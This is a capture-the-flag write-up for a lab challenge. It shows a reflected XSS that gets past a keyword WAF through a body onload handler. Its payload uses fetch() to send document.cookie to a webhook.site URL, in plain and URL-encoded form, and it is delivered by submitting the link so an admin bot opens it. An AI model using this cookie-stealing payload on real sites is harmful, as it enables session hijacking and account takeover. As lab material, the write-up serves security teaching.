# Challenge `Give me more than a simple WAF`

* **Flag:** `SSof{A_good_WAF_was_all_I_needed...}`
* **Vulnerability:** Reflected Cross-Site Scripting (XSS) with WAF bypass
* **Where:** Search bar input field and “Link of the bug/feature request you want to report on” field
* **Impact:** Allows an attacker to bypass keyword-based filtering and steal the administrator’s session cookie

---

## Steps to reproduce

1. Attempt to reuse the previous `<script>`-based payloads from Challenges 1 and 2.

2. Observe that the application now deploys a simple Web Application Firewall (WAF) that blocks common keywords such as:

* `script`
* `img`

3. To bypass the WAF, inject JavaScript through an HTML event handler instead of a `<script>` tag.

4. Insert the following WAF bypass payload into the search bar:

```html
<body onload="fetch(`https://webhook.site/0237655b-876d-49dc-b95f-9e890f48aa14?cookie=${document.cookie}`)">
```

5. After submitting the query, copy the URL-encoded version that appears in the browser and place it into the field:

> **“Link of the bug/feature request you want to report on”**

```text
http://ssof2526.challenges.cwte.me:25252/?search=%3Cbody+onload%3D%22fetch%28%60https%3A%2F%2Fwebhook.site%2F0237655b-876d-49dc-b95f-9e890f48aa14%3Fcookie%3D%24%7Bdocument.cookie%7D%60%29%22%3E
```

6. Click Submit to send the report.

7. When the administrator opens the submitted malicious link, the injected `onload` event exzecutes automatically in the admin’s browser.

8. The JavaScript sends the admin’s cookies to my Webhook endpoint.

9. Inspect the Webhook logs and retrieve the leaked admin cookie, which contains the flag:

```
SSof{A_good_WAF_was_all_I_needed...}
```